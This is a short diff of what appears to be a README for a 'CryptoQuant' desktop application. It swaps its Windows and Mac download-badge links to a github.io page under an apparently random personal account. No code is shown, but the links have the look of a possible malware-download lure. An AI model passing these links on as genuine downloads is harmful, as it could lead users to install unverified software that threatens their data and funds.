@@ -6,9 +6,9 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://cryptoquant-desktop.github.io/.github)  
+[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://coltencamachojbaw.github.io/.github/CryptoQuant)  
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://asdmasldkhas231.github.io/.github)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://coltencamachojbaw.github.io/.github/CryptoQuant)
 </div>
 
 ---
